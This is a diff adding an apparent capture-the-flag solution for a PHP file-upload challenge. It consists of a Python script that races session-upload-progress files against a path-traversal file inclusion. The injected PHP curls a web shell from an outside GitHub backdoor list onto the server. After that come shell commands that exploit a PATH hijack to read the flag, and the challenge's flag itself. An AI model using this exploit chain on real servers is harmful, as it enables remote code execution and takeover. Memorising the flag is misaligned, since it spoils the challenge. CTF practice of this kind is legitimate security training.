@@ -1,0 +1,67 @@
+'''
+import requests, os, _thread
+
+url = 'https://filestore.web.actf.co'
+
+def create_sess_file():
+	php_backdoor = 'https://raw.githubusercontent.com/backdoorhub/shell-backdoor-list/master/shell/php/simple-shell.php'
+	payload = f"<?php system('curl {php_backdoor} > /tmp/test.php'); ?>"
+	data = {'PHP_SESSION_UPLOAD_PROGRESS': 'ZZ' + payload + 'Z'}
+	headers = {'Connection': 'close', 'Cookie': 'PHPSESSID=test'}
+	while 1:
+		fp = open('solve.py', 'rb')
+		print('create sess file')
+		r = requests.post(url, files={'f': fp}, data=data, headers=headers)
+		fp.close()
+
+
+def exec_payload_1():
+	while 1:
+		print('execute payload 1')
+		r = requests.get(f"{url}/?f=../../../../../../../tmp/sess_test")
+
+
+def exec_payload_2():
+	while 1:
+		print('execute payload 2')
+		r = requests.get(f"{url}/?cmd=echo+'winner'&f=../../../../../../../tmp/test.php")
+		if 'winner' in r.text:
+				print('[+] Done!')
+				os._exit(0)
+
+
+_thread.start_new_thread(create_sess_file, ())
+_thread.start_new_thread(create_sess_file, ())
+_thread.start_new_thread(create_sess_file, ())
+
+_thread.start_new_thread(create_sess_file, ())
+_thread.start_new_thread(create_sess_file, ())
+_thread.start_new_thread(create_sess_file, ())
+
+_thread.start_new_thread(create_sess_file, ())
+_thread.start_new_thread(create_sess_file, ())
+_thread.start_new_thread(create_sess_file, ())
+
+_thread.start_new_thread(exec_payload_1, ())
+_thread.start_new_thread(exec_payload_1, ())
+_thread.start_new_thread(exec_payload_1, ())
+
+_thread.start_new_thread(exec_payload_2, ())
+
+
+while 1:
+	pass
+'''
+
+commands to execute with: (change CMD with the command)
+https://filestore.web.actf.co/?cmd=CMD&f=../../../../../../../tmp/test.php
+
+/make_abyss_entry	(it will return an id -> 5669afeb612f315e43805ce51dd3884d5cb91bc6915db219fa90ed84c42952ce)
+
+echo '/bin/cat /flag.txt' > /abyss/5669afeb612f315e43805ce51dd3884d5cb91bc6915db219fa90ed84c42952ce/ls
+echo '<?php chmod ("/abyss/5669afeb612f315e43805ce51dd3884d5cb91bc6915db219fa90ed84c42952ce/ls", 0777); ?>' > /abyss/5669afeb612f315e43805ce51dd3884d5cb91bc6915db219fa90ed84c42952ce/chmod.php
+php /abyss/5669afeb612f315e43805ce51dd3884d5cb91bc6915db219fa90ed84c42952ce/chmod.php
+PATH=/abyss/5669afeb612f315e43805ce51dd3884d5cb91bc6915db219fa90ed84c42952ce/ PWD=/abyss/5669afeb612f315e43805ce51dd3884d5cb91bc6915db219fa90ed84c42952ce/ /list_uploads
+
+
+actf{w4tch_y0ur_p4th_724248b559281824}
